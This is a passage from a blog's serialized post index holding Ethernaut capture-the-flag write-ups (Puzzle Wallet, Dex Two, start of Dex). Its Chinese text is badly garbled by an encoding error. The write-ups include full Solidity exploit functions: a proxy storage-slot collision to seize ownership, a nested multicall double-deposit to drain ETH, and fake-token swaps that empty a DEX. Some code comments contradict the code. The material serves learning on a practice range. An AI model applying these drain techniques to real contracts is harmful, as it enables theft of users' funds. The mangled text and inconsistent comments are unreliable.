åˆçº¦äº¤äº’ï¼Œæ‰€æœ‰çš„â€œæ•°æ®â€éƒ½å­˜å‚¨åœ¨è¿™é‡Œã€‚æ‚¨å¯ä»¥å°†æ­¤åˆçº¦è§†ä¸ºå‰ç«¯ã€‚ä»£ç†åˆçº¦ä¼šå°†æ‰€æœ‰ç”¨æˆ·äº¤äº’â€œè½¬å‘â€ç»™å®æ–½åˆçº¦- Proxyåˆçº¦çš„æ‰€æœ‰å®ç°éƒ½åœ¨Implementationåˆçº¦ä¸­å®ç°ã€‚è¿™å…è®¸ä»£ç†æ‰€æœ‰è€…åœ¨æŸä¸ªæ—¶å€™å‡çº§æŒ‡å‘å®æ–½åˆçº¦çš„â€œæŒ‡é’ˆâ€ï¼Œä»¥é˜²ä»–æƒ³è¦ä¿®å¤é”™è¯¯æˆ–å®æ–½æ–°åŠŸèƒ½ã€‚ä»£ç†åˆçº¦å†…éƒ¨é€šå¸¸æ²¡æœ‰å¤ªå¤šä»£ç ï¼ˆåªæœ‰ç®¡ç†å‡çº§/æˆæƒçš„ä»£ç ï¼‰å¹¶ä¸”å…·æœ‰å°†`fallback`æ‰€æœ‰ç”¨æˆ·äº¤äº’â€œè½¬å‘â€åˆ°åŒ…å«è¯¥åŠŸèƒ½çš„å®é™…å®ç°çš„å®ç°åˆçº¦çš„åŠŸèƒ½ã€‚è¿™ç§â€œè½¬å‘â€æ“ä½œæ˜¯é€šè¿‡`delegatecall`.åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘å‡è®¾æ‚¨å·²ç»çŸ¥é“ a æ˜¯å¦‚ä½•`delegatecall`å·¥ä½œçš„ï¼Œä½†å¦‚æœæ‚¨å¯¹æ‰€æœ‰è¿™äº›éƒ½ä¸ç†Ÿæ‚‰ï¼Œè¯·é˜…è¯»æ­¤å†…å®¹- [Solidity æ–‡æ¡£ï¼šDelegatecall / Callcode å’Œåº“](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)- [Sigma Primeï¼ŒSolidity Securityï¼šå·²çŸ¥æ”»å‡»åª’ä»‹å’Œå¸¸è§åæ¨¡å¼çš„ç»¼åˆåˆ—è¡¨ï¼šdelegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)å½“é€šè¿‡å‡½æ•°`ContractA`è°ƒç”¨`ContractB`çš„å‡½æ•°åœ¨ä»£ç ä¸Šæ‰§è¡Œæ—¶ï¼Œä½†æ•´ä¸ª**ä¸Šä¸‹æ–‡**ï¼ˆå’Œåˆçº¦çš„å­˜å‚¨ï¼‰æ˜¯æ¥è‡ª.`implementation()``delegatecall``ContractB``msg.sender``msg.value``ContractA`è¦è®°ä½çš„ä¸€ä¸ªå…³é”®æ¦‚å¿µæ˜¯ï¼Œå¦‚æœ`ContractB`ä»£ç åœ¨ a æœŸé—´æ›´æ–°åˆçº¦çš„å­˜å‚¨ï¼Œ`delegatecall`å®ƒä¸ä¼š**ä¿®æ”¹`ContractB`å­˜å‚¨ï¼Œè€Œæ˜¯ä¿®æ”¹`ContractA`å­˜å‚¨ï¼**`delegatecall`æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†å¦‚æœä½¿ç”¨ä¸å½“ï¼Œå®ƒä¹Ÿéå¸¸å¤æ‚å’Œå±é™©ã€‚è€ƒè™‘åˆ°æ‰€æœ‰è¿™äº›è§£é‡Šï¼Œè®©æˆ‘ä»¬çœ‹çœ‹åˆåŒ### `PuzzleProxy.sol````soliditycontract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor( address _admin, address _implementation, bytes memory _initData ) public UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin() &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125;&#125; è¿™æ˜¯ä»£ç†åˆçº¦ï¼Œæ¯ä¸ªç”¨æˆ·å°†ç›´æ¥ä¸è¿™ä¸ªåˆçº¦äº¤äº’ï¼Œå½“å‡½æ•°ï¼ˆåœ¨ ä¸­å®ç°ï¼‰è¢«æ‰§è¡Œæ—¶ï¼Œå®ƒå°†æŠŠæ‰€æœ‰å†…å®¹è½¬å‘ç»™åˆçº¦PuzzleWalletã€‚delegatecall``fallback``UpgradeableProxy fallbackä»…å½“ä¸Šè¿°å‡½æ•°å‡æœªè¢«è°ƒç”¨æ—¶æ‰ä¼šæ‰§è¡Œè¯¥å‡½æ•°ã€‚ é™¤äº†è½¬å‘å‘¼å«ä¹‹å¤–ï¼Œè¯¥åˆçº¦è¿˜å¤„ç†è§’è‰²adminï¼Œå³åˆ›å»ºè§’è‰²ä»¥å°†ä»£ç†â€œå‡çº§â€åˆ°æ–°çš„å®ç°ï¼Œä»¥é˜²éœ€è¦ä¿®å¤é”™è¯¯æˆ–å¿…é¡»å°†æ–°åŠŸèƒ½æ·»åŠ åˆ°åˆçº¦ä¸­ã€‚ ä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡ æè®®æ–°ç®¡ç†å‘˜proposeAdmin(address)ï¼Œä½†åªæœ‰å½“å‰ç®¡ç†å‘˜å¯ä»¥é€šè¿‡ æ‰¹å‡†æ–°ç®¡ç†å‘˜approveNewAdminã€‚ PuzzleWallet.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162contract PuzzleWallet &#123; using SafeMath for uint256; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted() &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] = balances[msg.sender].add(msg.value); &#125; function execute( address to, uint256 value, bytes calldata data ) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] = balances[msg.sender].sub(value); (bool success, ) = to.call&#123;value: value&#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125; è¿™æ˜¯ä¸€ä»½å¾ˆé•¿çš„åˆåŒï¼Œä½†é‡è¦çš„éƒ¨åˆ†åœ¨è¿™é‡Œã€‚ ä¸ºäº†è¿›è¡Œexecuteäº¤æ˜“ï¼Œæ‚¨å¿…é¡»åœ¨whitelistedæ˜ å°„ä¸­ã€‚ä¸è¯·æ±‚å‘é€åˆ°çš„è¯·æ±‚ç›¸æ¯”ï¼Œåªæœ‰executeä½™é¢msg.sender( )balances[msg.sender]``value``to whitelistedåªèƒ½é€šè¿‡owneråˆçº¦çš„å°†ç”¨æˆ·æ·»åŠ åˆ°æ˜ å°„ä¸­ ç™½åå•ç”¨æˆ·å¯ä»¥è°ƒç”¨depositå°† ETH å­˜å…¥åˆçº¦å¹¶æ›´æ–°ä½™é¢ æ”¯ä»˜æ›´å°‘çš„gasäº¤æ˜“å¯ä»¥é€šè¿‡multicallå‡½æ•°æ‰¹é‡æ‰§è¡Œ multicallå‡½æ•°åªå…è®¸å°†ä¸€ä¸ª depositå‘¼å«æ·»åŠ åˆ°æ‰¹å¤„ç†å‘¼å«åˆ—è¡¨çš„åˆ—è¡¨ä¸­ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢æœ‰äººé€šè¿‡å‘é€ X æ•°é‡çš„ ETHä½†åœ¨æ‰¹å¤„ç†äº¤æ˜“åˆ—è¡¨ä¸­multicallå¤šæ¬¡è°ƒç”¨deposit åˆ©ç”¨åˆåŒåœ¨å®¡æŸ¥ä»£ç ä¹‹åï¼Œä½ æ˜¯å¦è‡³å°‘å‘ç°äº†ä¸€äº›é—®é¢˜åœ¨å“ªé‡Œï¼Ÿæˆ‘ä¼šç»™ä½ ä¸€äº›æç¤ºï¼š åˆçº¦å’Œä»£ç†çš„å¸ƒå±€å­˜å‚¨ åˆåŒæ‰§è¡ŒæœŸé—´çš„ä¸Šä¸‹æ–‡delegatecall å¥½çš„ï¼Œè®©æˆ‘ä»¬è¿›å…¥å…”å­æ´ã€‚ é¦–å…ˆï¼ŒPuzzleProxyä¸è¦PuzzleWalletæœ‰ç›¸åŒçš„å¸ƒå±€å­˜å‚¨ã€‚è¿™æ„å‘³ç€å½“å®ƒåœ¨fromPuzzleWalletæœŸé—´æ‰§è¡ŒæŸäº›ä»£ç æ—¶ä¿®æ”¹çŠ¶æ€å˜é‡æ—¶ï¼Œå®ƒå¯èƒ½ä¼šæ— æ„ä¸­æ›´æ”¹é”™è¯¯å˜é‡çš„å€¼ã€‚delegatecall``PuzzleProxy è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ã€‚æˆ‘è°ƒç”¨PuzzleProxy.proposeNewAdmin(player)æè®®playeråœ°å€ä½œä¸ºä»£ç†åˆçº¦çš„æ–°ç®¡ç†å‘˜ã€‚è¯¥proposeNewAdminå‡½æ•°æ›´æ–°pendingAdminä½äº**.slot 0**ä¸­çš„å˜é‡PuzzleProxyã€‚ ä½ çŸ¥é“åˆçº¦çš„Slot 0é‡Œæœ‰ä»€ä¹ˆå—PuzzleWalletï¼Ÿå˜é‡address public ownerï¼ä½ çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€å—ï¼Ÿè¿™æ„å‘³ç€å½“é€šè¿‡fromPuzzleWalletæ‰§è¡Œå‡½æ•°æ—¶ï¼Œç°åœ¨æ˜¯!delegatecall``PuzzleProxy``pendingAdmin``owner æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æ˜¯çš„ownerï¼ŒPuzzleWalletä½†æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆä¸ºadminçš„PuzzleProxyã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›¸åŒçš„æ¼æ´åˆ©ç”¨ï¼Œä¸ºæ­¤æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ç§æ–¹æ³•è®©aæ‰§è¡Œæ—¶PuzzleWalletä¿®æ”¹å¸ƒå±€å­˜å‚¨çš„Slot 1 ã€‚delegatecall åœ¨åˆçº¦çš„Slot 1PuzzleWalletä¸Šï¼Œæœ‰maxBalanceå˜é‡ã€‚æˆ‘ä»¬åªéœ€è¦é€šè¿‡å°† Player åœ°å€è½¬æ¢ä¸ºæ•´æ•°æ¥æ›´æ–°è¯¥å€¼uint256(player)ã€‚ ä¿®æ”¹è¯¥å˜é‡çš„å”¯ä¸€å‡½æ•°æ˜¯setMaxBalanceåªèƒ½ç”±ç™½åå•ç”¨æˆ·è°ƒç”¨å¹¶ä¸”å½“åˆçº¦ä½™é¢ä¸º 0 æ—¶è°ƒç”¨ã€‚ æˆ‘ä»¬ç°åœ¨æ˜¯åˆçº¦çš„æ‰€æœ‰è€…ï¼ˆç”±äºæ¼æ´åˆ©ç”¨ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å°†è‡ªå·±æ·»åŠ åˆ°ç™½åå•ä¸­ï¼ŒaddToWhitelistä½†æˆ‘ä»¬ä»ç„¶éœ€è¦è§£å†³ä½™é¢é—®é¢˜ã€‚ æˆ‘ä»¬ç°åœ¨ç»ˆäºå¯ä»¥æ‰“ç”µè¯äº†å—setMaxBalance(uint256(player))ï¼Ÿæ²¡æœ‰ï¼ 1234function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance;&#125; å¦‚æœæ‚¨æŸ¥çœ‹ä»£ç ï¼Œå¦‚æœåˆçº¦ä¸­æœ‰ä»»ä½•ä½™é¢å¹¶ä¸”åˆçº¦æ˜¯0.001 etherç”±éƒ¨ç½²è€…åœ¨éƒ¨ç½²æ–¹èµ„åŠ©çš„ï¼Œäº¤æ˜“å°†æ¢å¤ã€‚ è¦å®ŒæˆæŒ‘æˆ˜å¹¶æˆä¸ºä»£ç†äººï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡è°ƒç”¨å¹¶ä½¿ç”¨è¯¥ä½™é¢adminæ¥è€—å°½åˆçº¦ã€‚é—®é¢˜æ˜¯ execute åªä¼šä½¿ç”¨ç”¨æˆ·çš„ä½™é¢ï¼Œå¦‚æœå®ƒç­‰äºå¹¶ä¸”æˆ‘ä»¬æ— æ³•åˆ©ç”¨è¯¥æœºåˆ¶ã€‚execute``0.001 ether``msg.sender æˆ‘ä»¬ä¸èƒ½ä¾èµ–depositï¼Œå› ä¸ºå³ä½¿æˆ‘ä»¬å­˜å…¥ä¸€äº›ä¸œè¥¿ç„¶åè°ƒç”¨executeæˆ‘ä»¬ä¹Ÿä¸èƒ½ä½¿ç”¨è¶…è¿‡æˆ‘ä»¬å­˜å…¥çš„ä¸œè¥¿ã€‚é‚£ä¹ˆç°åœ¨æ€ä¹ˆåŠï¼Ÿ è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹multicallåŠŸèƒ½ä»£ç ï¼Œçœ‹çœ‹é‚£é‡Œæ˜¯å¦æœ‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ 1234567891011121314151617function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125;&#125; è¯¥å‡½æ•°å…è®¸ç”¨æˆ·å°†å¤šä¸ªè°ƒç”¨ä¸€èµ·æ‰¹å¤„ç†ä»¥èŠ‚çœä¸€äº› gasï¼Œå¹¶ä¸”å¦‚æ‚¨æ‰€è§ï¼Œå®ƒæœ‰ä¸€ä¸ªæ£€æŸ¥ä»¥å…è®¸depositåœ¨æ‰¹å¤„ç†è°ƒç”¨ä¸­åªå…è®¸ä¸€ä¸ªè°ƒç”¨ã€‚éœ€è¦è¿›è¡Œæ­¤æ£€æŸ¥ä»¥é˜²æ­¢æœ‰äººåœ¨å‘é€ä¸€äº›ä»¥å¤ªå¸æ—¶æ·»åŠ å¤šä¸ªdepositã€‚å¦‚æœæ²¡æœ‰è¯¥æ”¯ç¥¨ï¼Œæ‚¨å°†èƒ½å¤Ÿå¯¹å‘é€çš„ä»¥å¤ªå¸è¿›è¡ŒåŒé‡è®¡ç®—ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘å‘é€äº†1 etherä¸¤ç¬”å­˜æ¬¾ï¼Œåœ¨äº¤æ˜“ç»“æŸæ—¶ï¼Œbalances[msg.sender]å°†ç­‰äº2 etherwhile Iâ€™ve sent only 1 etherã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•åˆ©ç”¨å®ƒå‘¢ï¼Ÿè™½ç„¶æˆ‘ä»¬ç¡®å®ä¸èƒ½å°†ä¸¤ä¸ªå­˜æ¬¾æ”¾åœ¨ä¸€ä¸ªé‡Œé¢multicallï¼Œä½†å¦‚æœæˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ªdepositç„¶åå¦ä¸€ä¸ªæ”¾åœ¨depositå¦ä¸€ä¸ªé‡Œé¢å‘¢multicallï¼Ÿ å¤šå‘¼å«å¼€å§‹ï¼ è®©æˆ‘ä»¬å‡†å¤‡multicallé€šè¯ 123456789101112bytes[] memory callsDeep = new bytes[](1);callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);bytes[] memory calls = new bytes[](2);calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls);// At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)// But `balances[player]` is equal to 0.002 ether!// We are able to call the `execute` method in a way that will send to us the whole contract&#x27;s balancepuzzleWallet.execute(player, 0.002 ether, &quot;&quot;); åœ¨executeæˆ‘ä»¬æˆåŠŸåœ°ä»åˆçº¦ä¸­ç§»é™¤æ‰€æœ‰ä»¥å¤ªå¸ä½™é¢ï¼ˆå¹¶è·å¾—0.001å…è´¹ä»¥å¤ªå¸ï¼‰ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨puzzleWallet.setMaxBalance(uint256(player)); é€šè¿‡è¿™æ ·åšï¼Œæˆ‘ä»¬ç°åœ¨æ˜¯åˆåŒçš„ç®¡ç†å‘˜PuzzleProxyï¼ è§£å†³æ–¹æ¡ˆä»£ç è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æˆ‘ä»¬éœ€è¦åšä»€ä¹ˆæ¥è§£å†³è¿™ä¸ªæŒ‘æˆ˜ é€šè¿‡è°ƒç”¨æˆä¸ºproposeNewAdmin(player)æ‰€æœ‰è€…PuzzleWallet``delegatecall ç°åœ¨æˆ‘ä»¬æ˜¯æ‰€æœ‰è€…ï¼ˆå½“PuzzleWalleté€šè¿‡è®¿é—®æ—¶delegatecallï¼‰æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å°†è‡ªå·±æ·»åŠ åˆ°ç™½åå•ç”¨æˆ·åˆ—è¡¨ä¸­addToWhitelist(player); æ„å»ºä¸€ä¸ªæ‰¹é‡è°ƒç”¨æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥ä¾¿èƒ½å¤Ÿå­˜å…¥0.001 etherä½†è®©åˆçº¦0.002 etheråœ¨æˆ‘ä»¬çš„ä½™é¢ä¸­è®¡å…¥ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä¸Šé¢çš„è§£é‡Š æ‰§è¡Œ multicallï¼Œç°åœ¨PuzzleWalleté‡Œé¢æ²¡æœ‰ä»¥å¤ªå¸äº† å‘¼åsetMaxBalance(uint256(player));æˆä¸ºadminçš„PuzzleProxy è¿™æ˜¯ç”¨äºè§£å†³æŒ‘æˆ˜çš„æµ‹è¯•ä»£ç  123456789101112131415161718192021222324252627282930function exploitLevel() internal override &#123; vm.startPrank(player, player); // Exploit the contract to become the owner of `PuzzleWallet` level.proposeNewAdmin(player); // Now that we are the admin, add ourself to the whitelisted user list // to be able to deposit, execute and multicall puzzleWallet.addToWhitelist(player); // Build the payload to drain the wallet and be able to call `setMaxBalance` bytes[] memory callsDeep = new bytes[](1); callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); bytes[] memory calls = new bytes[](2); calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep); puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls); // Execute the batched calls payload puzzleWallet.execute(player, 0.002 ether, &quot;&quot;); // Become the admin of the `PuzzleProxy` puzzleWallet.setMaxBalance(uint256(player)); // Assert that we have completed the challenge assertEq(level.admin(), player); vm.stopPrank();&#125; æ‚¨å¯ä»¥é˜…è¯»æŒ‘æˆ˜çš„å®Œæ•´è§£å†³æ–¹æ¡ˆæ‰“å¼€PuzzleWallet.t.sol 3. è§£æ","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Dex Two","slug":"Smart contracts/ethernaut/Dex Two","date":"2023-03-11T04:15:10.000Z","updated":"2023-03-11T04:15:10.000Z","comments":true,"path":"2023/03/11/Smart contracts/ethernaut/Dex Two/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/","excerpt":"","text":"Dex Two1. é¢˜ç›®è¦æ±‚ 1.1 This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token. Things that might help: é¢˜ç›®ä»£ç  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract DexTwo is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function add_liquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableTokenTwo is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 1234567891011121314151617181920212223## 2. åˆ†æ### tipsï¼š[å‚è€ƒåšå®¢](https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two)- 2.1 åˆ†æåˆçº¦ï¼š - `swap` å‡½æ•° ï¼š - ```solidity function swap( address from, address to, uint256 amount ) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; - å½“å‰`swap`å‡½æ•°ä¸æ£€æŸ¥`from`ï¼Œå®é™…ä¸Šæ˜¯åˆçº¦å¤„ç†çš„`to`ç™½åå•`token1`å’Œä»£å¸ã€‚`token2``DexTwo` è¿™æ˜¯è¯¥å‡½æ•°å…ˆå‰ç‰ˆæœ¬ä¸­å­˜åœ¨çš„æ£€æŸ¥ï¼š`require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);` è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿè¿™å…è®¸æ”»å‡»è€…è°ƒç”¨è¯¥`swap`å‡½æ•°ï¼Œå‡ºå”®**ä»»æ„** ä»¤ç‰Œä»¥ä» Dex`from`è·å–â€œçœŸå®â€ä»¤ç‰Œã€‚`to`è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª`UselessERC20`å®Œå…¨ç”±æˆ‘ä»¬æ‹¥æœ‰å’Œç®¡ç†çš„å…¨æ–°ä»£å¸ï¼ˆæˆ‘ä»¬å¯ä»¥é“¸é€ ã€é”€æ¯ã€åšä»»ä½•æˆ‘ä»¬æƒ³åšçš„äº‹ï¼‰å¹¶è·å¾—ä¸€äº›`token1`æˆ–`token2`å…è´¹è·å¾—ã€‚ æˆ‘ä»¬å¯ä»¥è€—å°½`DexTwo`åˆåŒ`token1`å¹¶`token2`å„æ‰“ä¸€æ¬¡ç”µè¯å—ï¼Ÿä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ­£ç¡®çš„`fakeToken`å–å‡ºæ•°é‡ä»¥å–å› 100 `token1`ã€‚ - åšæ•°å­¦è®¡ç®—ï¼Œçœ‹ä¸€ä¸‹getSwapAmountå‡½æ•° - &gt; ```unknown &gt; 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken &gt; 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken &gt; 123456 - æˆ‘ä»¬æœ‰ä¸¤ä¸ªå¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚æˆ‘ä»¬è‚¯å®šçŸ¥é“å®ƒ`DexBalanceOfFakeToken`å¿…é¡»**&gt; 1**å¦åˆ™äº¤æ˜“å°†å› ä¸ºè¢«**0 é™¤**è€Œæ¢å¤ã€‚å¦‚æœæˆ‘ä»¬å‘é€ 1`FakeToken`ç»™`DexTwo`æˆ‘ä»¬ - &gt; ```unknown100 token1 = amountOfFakeTokenToSell * 100 / 11 token1 = amountOfFakeTokenToSell - å› æ­¤ï¼Œé€šè¿‡`1 FakeToken1`å‘`DexTwo`åˆçº¦å‘é€ç»™å®ƒä¸€äº›æµåŠ¨æ€§ï¼Œæˆ‘ä»¬å¯ä»¥äº¤æ¢ 100`FakeToken`ä»¥å–å› 100 `token1`ã€‚ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹**å¦ä¸€ä¸ª**å®ä¾‹é‡å¤ç›¸åŒçš„æ“ä½œï¼Œå¹¶ä» Dex ä¸­`FakeToken2`æ’å‡ºæ‰€æœ‰çš„ã€‚`token2` æ”»å‡»åˆçº¦ function exploitLevel() internal override &#123; vm.startPrank(player, player); // Deploy a fake token based on the SwappableTokenTwo contract // Mint 10k tokens and send them to the player (msg.sender) SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); // Approve the dex to manage all of our token token1.approve(address(level), 2**256 - 1); token2.approve(address(level), 2**256 - 1); fakeToken1.approve(address(level), 2**256 - 1); fakeToken2.approve(address(level), 2**256 - 1); // send 1 fake token to the DexTwo to have at least 1 of liquidity ERC20(fakeToken1).transfer(address(level), 1); ERC20(fakeToken2).transfer(address(level), 1); // Swap 100 fakeToken1 to get 100 token1 level.swap(address(fakeToken1), address(token1), 1); // Swap 100 fakeToken2 to get 100 token2 level.swap(address(fakeToken2), address(token2), 1); // Assert that we have drained the Dex contract assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true); vm.stopPrank(); &#125; 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Dex","slug":"Smart contracts/ethernaut/Dex","date":"2023-03-10T02:17:10.000Z","updated":"2023-03-10T02:17:10.000Z","comments":true,"path":"2023/03/10/Smart contracts/ethernaut/Dex/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/10/Smart%20contracts/ethernaut/Dex/","excerpt":"","text":"Dex1. é¢˜ç›®è¦æ±‚ 1.1 æ­¤é¢˜ç›®çš„ç›®æ ‡æ˜¯è®©æ‚¨ç ´è§£ä¸‹é¢çš„åŸºæœ¬åˆçº¦å¹¶é€šè¿‡ä»·æ ¼æ“çºµçªƒå–èµ„é‡‘ã€‚ ä¸€å¼€å§‹æ‚¨å¯ä»¥å¾—åˆ°10ä¸ªtoken1å’Œtoken2ã€‚åˆçº¦ä»¥æ¯ä¸ªä»£å¸100ä¸ªå¼€å§‹ã€‚ 